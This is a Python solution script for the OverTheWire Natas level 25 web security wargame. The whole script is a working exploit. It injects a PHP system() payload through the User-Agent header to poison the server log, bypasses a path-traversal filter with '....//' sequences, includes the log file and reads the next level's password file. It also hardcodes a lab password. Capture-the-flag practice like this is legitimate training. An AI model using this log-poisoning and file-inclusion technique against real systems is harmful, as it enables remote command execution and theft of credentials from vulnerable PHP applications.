import requests
import re

username = 'natas25'
password = 'O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx'

url = 'http://%s.natas.labs.overthewire.org/' % username

with open('natas25.html', 'w+') as out:
    session = requests.Session()
    header = {'User-Agent': '<?php system("echo Password: && cat /etc/natas_webpass/natas26") ?>'}
    res = session.get(url, auth=(username, password))
    res = session.post(url, auth=(username, password), data={
        'lang': '....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_' + session.cookies['PHPSESSID'] + '.log'}, headers=header)
    content = res.text
    out.write(content)
    flag = re.findall('Password:\n(.+?)\n "Directory traversal attempt! fixing request."', content)[0]
    print(flag)
